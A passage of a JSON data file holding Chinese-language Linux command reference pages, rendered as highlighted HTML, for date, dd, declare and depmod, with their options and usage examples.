class=\"hljs-selector-tag\">p</span></span>      用于表示当地的AM或PM，如果未知则为空白\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">P</span></span>      类似于%p，但用小写表示\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">q</span></span>      季度，范围（1..4）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">r</span></span>      当地以12小时表示的时钟时间（例如，11:11:04 PM）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">R</span></span>      24小时每分钟；等价于%H:%M\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">s</span></span>      自协调世界时1970年01月01日00时00分以来的秒数\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">S</span></span>      秒数，范围（00..60）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">t</span></span>      水平制表符\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">T</span></span>      时间；等价于%H:%M:%S\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">u</span></span>      一周中的一天（1..7），1代表星期一\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">U</span></span>      一年中的第几周，周日作为一周的起始（00..53）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">V</span></span>      ISO标准计数周，该方法将周一作为一周的起始（01..53）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">w</span></span>      一周中的一天（0..6），0代表星期天\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">W</span></span>      一年中的第几周，周一作为一周的起始（00..53）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">x</span></span>      当地的日期表示（例如，12/31/99）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">X</span></span>      当地的时间表示（例如，23:13:48）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">y</span></span>      年份后两位数字，范围（00..99）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">Y</span></span>      年份\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">z</span></span>      +hhmm格式的数值化时区格式（例如，-0400）\n<span class=\"hljs-tag\">%</span>:z     +hh:mm格式的数值化时区格式（例如，-04:00）\n<span class=\"hljs-tag\">%</span>::z    +hh:mm:ss格式的数值化时区格式（例如，-04:00:00）\n<span class=\"hljs-tag\">%</span>:::z   数值化时区格式，相比上一个格式增加':'以显示必要的精度（例如，-04，+05:30）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">Z</span></span>      时区缩写（如EDT）\n\n默认情况下，日期用零填充数字字段；以下可选的符号可以跟在'%'后面:\n\n-<span class=\"language-ruby\">      (连字符) 不要填充相应的字段。</span>\n_      (下划线) 使用空格填充相应的字段。\n0      (数字0) 使用数字0填充相应的字段。\n+      用数字0填充，未来年份大于4位数字则在前面加上'+'号。\n^      允许的情况下使用大写。\n#      允许的情况下将默认的大写转换为小写，默认的小写转换为大写。\n\n在任何标志之后都有一个可选的字段宽度，如小数；然后是一个可选的修饰符，在可用的情况下，使用E来使用当地语言环境的替代表示，\n使用O来使用当地语言环境的替代数字符号。\n</code></pre>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">长选项与短选项等价\n\n-<span class=\"hljs-string\">d</span>, <span class=\"hljs-built_in\">--date=STRING</span>          解析字符串并按照指定格式输出，字符串不能是<span class=\"hljs-string\">'now'</span>。\n<span class=\"hljs-built_in\">--debug</span>                    注释已解析的日期，并将有疑问的用法发送到标准错误。\n-<span class=\"hljs-string\">f</span>, <span class=\"hljs-built_in\">--file=DATEFILE</span>        类似于<span class=\"hljs-built_in\">--date;</span> 一次从<span class=\"hljs-string\">DATEFILE</span>处理一行。\n-<span class=\"hljs-string\">I</span>[<span class=\"hljs-string\">FMT</span>], <span class=\"hljs-built_in\">--iso-8601[=FMT]</span>  按照<span class=\"hljs-string\">ISO</span> <span class=\"hljs-string\">8601</span>格式输出，<span class=\"hljs-string\">FMT</span>可以为<span class=\"hljs-string\">'date'</span>(默认)，<span class=\"hljs-string\">'hours'</span>，<span class=\"hljs-string\">'minutes'</span>，<span class=\"hljs-string\">'seconds'</span>，<span class=\"hljs-string\">'ns'</span>。\n                           例如：<span class=\"hljs-string\">2006-08-14T02:34:</span><span class=\"hljs-string\">56-06:00\n</span>-<span class=\"hljs-string\">R</span>, <span class=\"hljs-built_in\">--rfc-email</span>            按照<span class=\"hljs-string\">RFC</span> <span class=\"hljs-string\">5322</span>格式输出，例如: <span class=\"hljs-string\">Mon</span>, <span class=\"hljs-string\">14</span> <span class=\"hljs-string\">Aug</span> <span class=\"hljs-string\">2006</span> <span class=\"hljs-string\">02:34:</span><span class=\"hljs-string\">56</span> -<span class=\"hljs-string\">0600</span>\n<span class=\"hljs-built_in\">--rfc-3339=FMT</span>             按照<span class=\"hljs-string\">RFC</span> <span class=\"hljs-string\">3339</span>格式输出，<span class=\"hljs-string\">FMT</span>可以为<span class=\"hljs-string\">'date'</span>, <span class=\"hljs-string\">'seconds'</span>,<span class=\"hljs-string\">'ns'</span>中的一个，\n                           例如：<span class=\"hljs-string\">2006-08-14</span> <span class=\"hljs-string\">02:34:</span><span class=\"hljs-string\">56-06:00\n</span>-<span class=\"hljs-string\">r</span>, <span class=\"hljs-built_in\">--reference=FILE</span>       显示文件的上次修改时间。\n-<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--set=STRING</span>           根据字符串设置系统时间。\n-<span class=\"hljs-string\">u</span>, <span class=\"hljs-built_in\">--utc,</span> <span class=\"hljs-built_in\">--universal</span>     显示或设置世界协调时(<span class=\"hljs-string\">UTC</span>)。\n<span class=\"hljs-built_in\">--help</span>                     显示帮助信息并退出。\n<span class=\"hljs-built_in\">--version</span>                  显示版本信息并退出。\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态为成功除非给出了非法选项或非法参数。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 格式化输出：</span>\ndate +<span class=\"hljs-string\">\"%Y-%m-%d\"</span>\n<span class=\"hljs-number\">2009</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">07</span>\n\n<span class=\"hljs-comment\"># 输出昨天日期：</span>\ndate -d <span class=\"hljs-string\">\"1 day ago\"</span> +<span class=\"hljs-string\">\"%Y-%m-%d\"</span>\n<span class=\"hljs-number\">2012</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">19</span>\n\n<span class=\"hljs-comment\"># 2秒后输出：</span>\ndate -d <span class=\"hljs-string\">\"2 second\"</span> +<span class=\"hljs-string\">\"%Y-%m-%d %H:%M.%S\"</span>\n<span class=\"hljs-number\">2012</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">21.31</span>\n\n<span class=\"hljs-comment\"># 传说中的 1234567890 秒：</span>\ndate -d <span class=\"hljs-string\">\"1970-01-01 1234567890 seconds\"</span> +<span class=\"hljs-string\">\"%Y-%m-%d %H:%M:%S\"</span>\n<span class=\"hljs-comment\"># 或者</span>\ndate -d@1234567890 +<span class=\"hljs-string\">\"%F %T\"</span>\n<span class=\"hljs-comment\"># 输出结果</span>\n<span class=\"hljs-number\">2009</span>-<span class=\"hljs-number\">02</span>-<span class=\"hljs-number\">13</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">30</span>\n\n<span class=\"hljs-comment\"># 时间格式转换：</span>\ndate -d <span class=\"hljs-string\">\"2009-12-12\"</span> +<span class=\"hljs-string\">\"%Y/%m/%d %H:%M.%S\"</span>\n<span class=\"hljs-comment\"># 输出结果</span>\n<span class=\"hljs-number\">2009</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">12</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">00</span>\n\n<span class=\"hljs-comment\"># apache格式转换：</span>\ndate -d <span class=\"hljs-string\">\"Dec 5, 2009 12:00:37 AM\"</span> +<span class=\"hljs-string\">\"%Y-%m-%d %H:%M.%S\"</span>\n<span class=\"hljs-comment\"># 输出结果</span>\n<span class=\"hljs-number\">2009</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">05</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">37</span>\n\n<span class=\"hljs-comment\"># 格式转换后时间游走：</span>\ndate -d <span class=\"hljs-string\">\"Dec 5, 2009 12:00:37 AM 2 year ago\"</span> +<span class=\"hljs-string\">\"%Y-%m-%d %H:%M.%S\"</span>\n<span class=\"hljs-comment\"># 输出结果</span>\n<span class=\"hljs-number\">2007</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">05</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">37</span>\n\n<span class=\"hljs-comment\"># 时间加减操作：</span>\ndate +%Y%m%d                   <span class=\"hljs-comment\"># 显示年月日</span>\ndate -d <span class=\"hljs-string\">\"+1 day\"</span> +%Y%m%d       <span class=\"hljs-comment\"># 显示前一天的日期</span>\ndate -d <span class=\"hljs-string\">\"-1 day\"</span> +%Y%m%d       <span class=\"hljs-comment\"># 显示后一天的日期</span>\ndate -d <span class=\"hljs-string\">\"-1 month\"</span> +%Y%m%d     <span class=\"hljs-comment\"># 显示上一月的日期</span>\ndate -d <span class=\"hljs-string\">\"+1 month\"</span> +%Y%m%d     <span class=\"hljs-comment\"># 显示下一月的日期</span>\ndate -d <span class=\"hljs-string\">\"-1 year\"</span> +%Y%m%d      <span class=\"hljs-comment\"># 显示前一年的日期</span>\ndate -d <span class=\"hljs-string\">\"+1 year\"</span> +%Y%m%d      <span class=\"hljs-comment\"># 显示下一年的日期</span>\n\n<span class=\"hljs-comment\"># 设定时间：</span>\ndate -s                         <span class=\"hljs-comment\"># 设置当前时间，只有root权限才能设置，其他只能查看</span>\ndate -s <span class=\"hljs-number\">20120523</span>                <span class=\"hljs-comment\"># 设置成20120523，这样会把具体时间设置成00:00:00</span>\ndate -s <span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">01</span>                <span class=\"hljs-comment\"># 设置具体时间，不会对日期做更改</span>\ndate -s <span class=\"hljs-string\">\"01:01:01 2012-05-23\"</span>   <span class=\"hljs-comment\"># 这样可以设置全部时间</span>\ndate -s <span class=\"hljs-string\">\"01:01:01 20120523\"</span>     <span class=\"hljs-comment\"># 这样可以设置全部时间</span>\ndate -s <span class=\"hljs-string\">\"2012-05-23 01:01:01\"</span>   <span class=\"hljs-comment\"># 这样可以设置全部时间</span>\ndate -s <span class=\"hljs-string\">\"20120523 01:01:01\"</span>     <span class=\"hljs-comment\"># 这样可以设置全部时间</span>\n\n<span class=\"hljs-comment\"># 有时需要检查一组命令花费的时间：</span>\nstart=$(date +%s)\nnmap wangchujiang.com &amp;&gt; <span class=\"hljs-regexp\">/dev/null</span>\nend=$(date +%s)\ndifference=$(( end - start ))\n<span class=\"hljs-comment\"># 显示执行时间</span>\necho $difference seconds.\n\n<span class=\"hljs-comment\"># 当你考虑输出带有时间的字符串时，例如（Current time: 2019/05/19）：</span>\n<span class=\"hljs-comment\"># 通常使用的方法：</span>\necho <span class=\"hljs-string\">\"Current time: $(date +\"</span>%Y/%m/%d<span class=\"hljs-string\">\")\"</span>\n<span class=\"hljs-comment\"># 另一种方法：</span>\nsuffix=<span class=\"hljs-string\">'Current time:'</span>\n<span class=\"hljs-comment\"># 注意如果换成单引号就不能替换变量了。</span>\ndate +<span class=\"hljs-string\">\"<span class=\"hljs-subst\">${suffix}</span> %Y/%m/%d\"</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 date</code>或<code>info coreutils 'date invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "dd",
        "des": "复制文件并对原文件的内容进行转换和格式化处理",
        "body": "<h1 id=\"dd\">dd</h1>\n<p>复制文件并对原文件的内容进行转换和格式化处理</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dd命令</strong> 用于复制文件并对原文件的内容进行转换和格式化处理。dd命令功能很强大的，对于一些比较底层的问题，使用dd命令往往可以得到出人意料的效果。用的比较多的还是用dd来备份裸设备。但是不推荐，如果需要备份oracle裸设备，可以使用rman备份，或使用第三方软件备份，使用dd的话，管理起来不太方便。</p>\n<p>建议在有需要的时候使用dd 对物理磁盘操作，如果是文件系统的话还是使用tar backup cpio等其他命令更加方便。另外，使用dd对磁盘操作时，最好使用块设备文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dd</span>(选项)</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">bs</span><span class=\"hljs-operator\">=</span>&lt;字节数&gt;：将ibs（输入）与obs（输出）设成指定的字节数；\n<span class=\"hljs-attribute\">cbs</span><span class=\"hljs-operator\">=</span>&lt;字节数&gt;：转换时，每次只转换指定的字节数；\n<span class=\"hljs-attribute\">conv</span><span class=\"hljs-operator\">=</span>&lt;关键字&gt;：指定文件转换的方式；\n<span class=\"hljs-attribute\">count</span><span class=\"hljs-operator\">=</span>&lt;区块数&gt;：仅读取指定的区块数；\n<span class=\"hljs-attribute\">ibs</span><span class=\"hljs-operator\">=</span>&lt;字节数&gt;：每次读取的字节数；\n<span class=\"hljs-attribute\">obs</span><span class=\"hljs-operator\">=</span>&lt;字节数&gt;：每次输出的字节数；\n<span class=\"hljs-attribute\">of</span><span class=\"hljs-operator\">=</span>&lt;文件&gt;：输出到文件；\n<span class=\"hljs-attribute\">seek</span><span class=\"hljs-operator\">=</span>&lt;区块数&gt;：一开始输出时，跳过指定的区块数；\n<span class=\"hljs-attribute\">skip</span><span class=\"hljs-operator\">=</span>&lt;区块数&gt;：一开始读取时，跳过指定的区块数；\n--help：帮助；\n--version：显示版本信息。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost text]# dd <span class=\"hljs-attribute\">if</span>=/dev/zero <span class=\"hljs-attribute\">of</span>=sun.txt <span class=\"hljs-attribute\">bs</span>=1M <span class=\"hljs-attribute\">count</span>=1\n1+0 records <span class=\"hljs-keyword\">in</span>\n1+0 records out\n1048576 bytes (1.0 MB) copied, 0.006107 seconds, 172 MB/s\n\n[root@localhost text]# du -sh sun.txt \n1.1M    sun.txt\n</code></pre>\n<p>该命令创建了一个1M大小的文件sun.txt，其中参数解释：</p>\n<ul>\n<li><strong>if</strong>  代表输入文件。如果不指定if，默认就会从stdin中读取输入。</li>\n<li><strong>of</strong>  代表输出文件。如果不指定of，默认就会将stdout作为默认输出。</li>\n<li><strong>bs</strong>  代表字节为单位的块大小。</li>\n<li><strong>count</strong>  代表被复制的块数。</li>\n<li><strong>/dev/zero</strong>  是一个字符设备，会不断返回0值字节（\\0）。</li>\n</ul>\n<p>块大小可以使用的计量单位表</p>\n<table>\n<thead>\n<tr>\n<th>单元大小</th>\n<th>代码</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字节（1B）</td>\n<td>c</td>\n</tr>\n<tr>\n<td>字节（2B）</td>\n<td>w</td>\n</tr>\n<tr>\n<td>块（512B）</td>\n<td>b</td>\n</tr>\n<tr>\n<td>千字节（1024B）</td>\n<td>k</td>\n</tr>\n<tr>\n<td>兆字节（1024KB）</td>\n<td>M</td>\n</tr>\n<tr>\n<td>吉字节（1024MB）</td>\n<td>G</td>\n</tr>\n</tbody></table>\n<p>以上命令可以看出dd命令来测试内存操作速度：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">1048576 </span>bytes (<span class=\"hljs-number\">1.0</span> MB) copied, <span class=\"hljs-number\">0.006107</span> seconds, <span class=\"hljs-number\">172</span> MB/s\n</code></pre>\n<p><strong>生成随机字符串</strong></p>\n<p>我们甚至可以使用 /dev/urandom 设备配合 dd 命令 来获取随机字符串。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# dd <span class=\"hljs-attribute\">if</span>=/dev/urandom <span class=\"hljs-attribute\">bs</span>=1 <span class=\"hljs-attribute\">count</span>=15|base64 -w 0\n15+0 records <span class=\"hljs-keyword\">in</span>\n15+0 records out\n15 bytes (15 B) copied, 0.000111993 s, 134 kB/s\nwFRAnlkXeBXmWs1MyGEs\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "declare",
        "des": "声明变量，设置或显示变量的值和属性。",
        "body": "<h1 id=\"declare\">declare</h1>\n<p>声明变量，设置或显示变量的值和属性。</p>\n<h2 id=\"语法\">语法</h2>\n<pre><code class=\"language-shell\">declare <span class=\"hljs-comment\">[-aAfFgilnrtux]</span> <span class=\"hljs-comment\">[-p]</span> <span class=\"hljs-comment\">[name<span class=\"hljs-comment\">[=value]</span> ...]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>显示包含指定属性的全部变量和值</li>\n<li>显示包含指定属性的一到多个变量和值</li>\n<li>显示一到多个变量的属性和值</li>\n<li>显示所有变量的属性和值并显示函数的定义</li>\n<li>显示所有变量的属性和值</li>\n<li>显示所有全局变量的属性和值</li>\n<li>显示全部函数名和函数定义</li>\n<li>只显示全部函数名</li>\n<li>显示一到多个函数名和函数定义</li>\n<li>只显示一到多个函数名</li>\n<li>声明全局变量（可选：赋值）</li>\n<li>声明变量（可选：赋值、属性）</li>\n<li>增加、删除变量的属性（可选：赋值）</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f 将操作或显示限制为函数名及函数定义。</span>\n<span class=\"hljs-deletion\">-F 只显示函数名（调试时附加行号和源文件）。</span>\n<span class=\"hljs-deletion\">-g 在shell函数中使用时创建全局变量；其他情况下忽略。</span>\n<span class=\"hljs-deletion\">-p 显示每个名称的属性和值。</span>\n\n*设置属性的选项:\n<span class=\"hljs-deletion\">-a 创建数组（如果支持）。</span>\n<span class=\"hljs-deletion\">-A 创建关联数组（如果支持）。</span>\n<span class=\"hljs-deletion\">-i 增加整型属性。</span>\n<span class=\"hljs-addition\">+i 删除整型属性。</span>\n<span class=\"hljs-deletion\">-l 增加小写属性，变量的值将转换为小写。</span>\n<span class=\"hljs-addition\">+l 删除小写属性。</span>\n<span class=\"hljs-deletion\">-n 增加引用属性（如果该选项存在）。</span>\n<span class=\"hljs-addition\">+n 删除引用属性（如果该选项存在）。</span>\n<span class=\"hljs-deletion\">-r 增加只读属性。</span>\n<span class=\"hljs-deletion\">-t 增加追踪属性。</span>\n<span class=\"hljs-addition\">+t 删除追踪属性。</span>\n<span class=\"hljs-deletion\">-u 增加大写属性，变量的值将转换为大写。</span>\n<span class=\"hljs-addition\">+u 删除大写属性。</span>\n<span class=\"hljs-deletion\">-x 增加导出属性。</span>\n<span class=\"hljs-addition\">+x 删除导出属性。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">name</span>（可选）：变量名或函数名。\nvalue（可选）：变量的值。\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>declare 返回true除非你提供了非法选项或赋值错误。具体导致异常的情况请查看<strong>讨论</strong>章节的<strong>关于异常情况</strong>。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 声明变量，当然也欢迎您在这个网站（感谢本项目发起人 @jaywcjlove）查询linux命令。</span>\n<span class=\"hljs-built_in\">declare</span> reference_website=<span class=\"hljs-string\">'https://wangchujiang.com/linux-command/'</span>\n\n<span class=\"hljs-comment\"># 显示所有包含整型属性的变量和值。</span>\n<span class=\"hljs-built_in\">declare</span> -i\n<span class=\"hljs-comment\"># 定义变量b并赋值为3，具有整型属性。</span>\n<span class=\"hljs-built_in\">declare</span> -i b=5\n<span class=\"hljs-comment\"># 显示属性，返回 declare -i b=\"5\"。</span>\n<span class=\"hljs-built_in\">declare</span> -p b\n<span class=\"hljs-comment\"># 删除整型属性。</span>\n<span class=\"hljs-built_in\">declare</span> +i b\n<span class=\"hljs-comment\"># 显示属性，返回 declare -- b=\"5\"。</span>\n<span class=\"hljs-built_in\">declare</span> -p b\n<span class=\"hljs-comment\"># 根据变量属性强制转换值的英文大小写。</span>\n<span class=\"hljs-built_in\">declare</span> -u uc_var=<span class=\"hljs-string\">'abc'</span>\n<span class=\"hljs-built_in\">declare</span> -l lc_var=<span class=\"hljs-string\">'ABC'</span>\n<span class=\"hljs-comment\"># 显示'ABC abc';</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${uc_var}</span> <span class=\"hljs-variable\">${lc_var}</span>\"</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 定义函数内的全局变量</span>\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">test</span></span>(){\n  <span class=\"hljs-built_in\">declare</span> -g a=3\n  <span class=\"hljs-comment\"># 或者</span>\n  <span class=\"hljs-built_in\">local</span> -g b=3\n  <span class=\"hljs-comment\"># 或者</span>\n  c=3\n  <span class=\"hljs-comment\"># 让我们查看它们的属性。</span>\n  <span class=\"hljs-built_in\">declare</span> -p a b c\n}\n<span class=\"hljs-comment\"># 执行函数。</span>\n<span class=\"hljs-built_in\">test</span>\n<span class=\"hljs-comment\"># 返回结果。</span>\n<span class=\"hljs-comment\"># declare -- a=\"3\"</span>\n<span class=\"hljs-comment\"># declare -- b=\"3\"</span>\n<span class=\"hljs-comment\"># declare -- c=\"3\"</span>\n\n<span class=\"hljs-comment\"># 定义函数外的全局变量</span>\n<span class=\"hljs-built_in\">declare</span> a=3\nb=3\n<span class=\"hljs-built_in\">declare</span> –p a b\n<span class=\"hljs-comment\"># 返回结果如下。</span>\n<span class=\"hljs-comment\"># declare -- a=\"3\"</span>\n<span class=\"hljs-comment\"># declare -- b=\"3\"</span>\n\n<span class=\"hljs-comment\"># 定义局部变量</span>\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">test2</span></span>(){\n  <span class=\"hljs-built_in\">local</span> -i a=3\n  <span class=\"hljs-built_in\">declare</span> -i b=3\n}\ntest2\n<span class=\"hljs-comment\"># 没有该变量（已经被销毁了）</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${a}</span> <span class=\"hljs-variable\">${b}</span>\"</span>\n<span class=\"hljs-comment\"># 因此，我们日常脚本中最常见的类似于'a=3'实际上是声明并赋值了一个全局变量。</span>\n<span class=\"hljs-comment\"># 在接下来的 **讨论** 环节会延伸讨论全局和局部变量问题。</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 注意，不能使用 `+a` 或 `+A` 取消数组，也不能使用 `+r` 取消只读属性。</span>\n\n<span class=\"hljs-comment\"># 定义只读数组，设置属性的同时定义赋值。</span>\n<span class=\"hljs-built_in\">declare</span> -ar season=(<span class=\"hljs-string\">'Spring'</span> <span class=\"hljs-string\">'Summer'</span> <span class=\"hljs-string\">'Autumn'</span> <span class=\"hljs-string\">'Winter'</span>)\n<span class=\"hljs-comment\"># 或者这样。</span>\nseason=(<span class=\"hljs-string\">'Spring'</span> <span class=\"hljs-string\">'Summer'</span> <span class=\"hljs-string\">'Autumn'</span> <span class=\"hljs-string\">'Winter'</span>)\n<span class=\"hljs-built_in\">declare</span> -ar season\n<span class=\"hljs-comment\"># 显示所有数组。</span>\n<span class=\"hljs-built_in\">declare</span> -a\n<span class=\"hljs-comment\"># 定义关联数组。</span>\n\n<span class=\"hljs-built_in\">declare</span> -A fruits=([<span class=\"hljs-string\">'apple'</span>]=<span class=\"hljs-string\">'red'</span> [<span class=\"hljs-string\">'banana'</span>]=<span class=\"hljs-string\">'yellow'</span>)\n<span class=\"hljs-comment\"># 显示所有关联数组。</span>\n<span class=\"hljs-built_in\">declare</span> -A\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 显示所有变量的属性和值并显示函数的定义，输出很长。</span>\n<span class=\"hljs-built_in\">declare</span>\n<span class=\"hljs-comment\"># 显示所有变量的属性和值。</span>\n<span class=\"hljs-built_in\">declare</span> -p\n<span class=\"hljs-comment\"># 显示所有全局变量的属性和值。</span>\n<span class=\"hljs-built_in\">declare</span> -g\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 显示全部函数名和函数定义。</span>\n<span class=\"hljs-keyword\">declare</span> -f\n<span class=\"hljs-comment\"># 只显示全部函数名。</span>\n<span class=\"hljs-keyword\">declare</span> -F\n\n<span class=\"hljs-comment\"># 定义两个函数。</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">func_a</span>(<span class=\"hljs-params\"></span>)</span>{ <span class=\"hljs-keyword\">echo</span> $(date +<span class=\"hljs-string\">\"%F %T\"</span>); }\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">func_b</span>(<span class=\"hljs-params\"></span>)</span>{ cd /; ls -lh --sort=time; }\n<span class=\"hljs-comment\"># 显示一到多个函数名和函数定义。</span>\n<span class=\"hljs-keyword\">declare</span> -f func_a func_b\n<span class=\"hljs-comment\"># 只显示一到多个函数名，验证某个名称是否已经定义为函数时有用。</span>\n<span class=\"hljs-keyword\">declare</span> -F func_a func_b\n<span class=\"hljs-comment\"># 最好不要让函数名和变量名相同。</span>\n</code></pre>\n<h2 id=\"讨论\">讨论</h2>\n<ol>\n<li><p>全局和局部变量</p>\n<p>正如上面<strong>例子</strong>指出的情况，我们在日常编写程序的时候需要了解这些概念，在这里\n做个简要地介绍，当然你也可以很方便的搜索到相关内容。</p>\n<ul>\n<li>全局变量：在整个脚本执行期间，只要没有被删除就<strong>一直存在</strong>。</li>\n<li>局部变量：在函数内定义，函数执行后就被删除。</li>\n</ul>\n<p>建议函数内使用<code>local</code>命令，函数外使用<code>declare</code>命令。</p>\n<blockquote>\n<p><em>不要在脚本中定义过多的全局变量，那样可能会被其他函数调用造成意料之外的后果，并且也不方便检查出来。</em></p>\n<p><em>更不用说缺乏必要的注释了 —— ZhuangZhu-74</em></p>\n</blockquote>\n<p>相关资料：</p>\n<ul>\n<li><a href=\"https://github.com/google/styleguide\">google提供的编码规范</a></li>\n<li><a href=\"https://unix.stackexchange.com/questions/381761/what-do-declare-name-and-declare-g-do\">全局变量的讨论</a></li>\n</ul>\n</li>\n<li><p>关于<code>declare</code> <code>typeset</code> <code>export</code> <code>local</code> <code>readonly</code>命令</p>\n<p>为什么<code>declare</code>能做到的事，还需要定义其他这些命令呢？</p>\n<p>因为这样语句含义会更加明确，例如：</p>\n<ul>\n<li>设置导出属性的变量时，<code>export var</code>和<code>declare -x var</code>。</li>\n<li>在函数内声明变量时，使用<code>local</code>。</li>\n<li>声明只读变量，使用<code>readonly</code>。</li>\n</ul>\n<p><code>typeset</code>和<code>declare</code>命令一样。</p>\n</li>\n<li><p>关于异常情况</p>\n<p>有多种原因导致<code>declare</code>失败，关于这些情况可以参考<a href=\"https://www.gnu.org/software/bash/manual/bash.html#index-declare\">bash在线文档declare部分(最新版)</a>，或执行 <code>info bash</code>\n查看<code>declare</code>部分最后一大串<code>an attempt is</code>开头的句子。</p>\n</li>\n</ol>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n<li>导出属性的相关介绍请查看'export'命令。</li>\n<li>只读属性的相关介绍请查看'readonly'命令。</li>\n<li>引用属性的相关介绍请查看'unset'命令的例子部分。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "depmod",
        "des": "分析可载入模块的相依性",
        "body": "<h1 id=\"depmod\">depmod</h1>\n<p>分析可载入模块的相依性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>depmod命令</strong> 可产生模块依赖的映射文件，在构建嵌入式系统时，需要由这个命令来生成相应的文件，由modprobe使用。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">depmod</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a或--all：分析所有可用的模块；</span>\n<span class=\"hljs-deletion\">-d或debug：执行排错模式；</span>\n<span class=\"hljs-deletion\">-e：输出无法参照的符号；</span>\n<span class=\"hljs-deletion\">-i：不检查符号表的版本；</span>\n<span class=\"hljs-deletion\">-m&lt;文件&gt;或system-map&lt;文件&gt;：使用指定的符号表文件；</span>\n<span class=\"hljs-deletion\">-s或--system-log：在系统记录中记录错误；</span>\n<span class=\"hljs-deletion\">-v或--verbose：执行时显示详细的信息；</span>\n<span class=\"hljs-deletion\">-V或--version：显示版本信息；</span>\n<span class=\"hljs-deletion\">--help：显示帮助。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">depmod -b <span class=\"hljs-regexp\">/home/</span>windsome<span class=\"hljs-regexp\">/EMMA3PF-KernelSource-20080626/i</span>nstall_pos -e -F .<span class=\"hljs-regexp\">/boot/</span>System.map -v 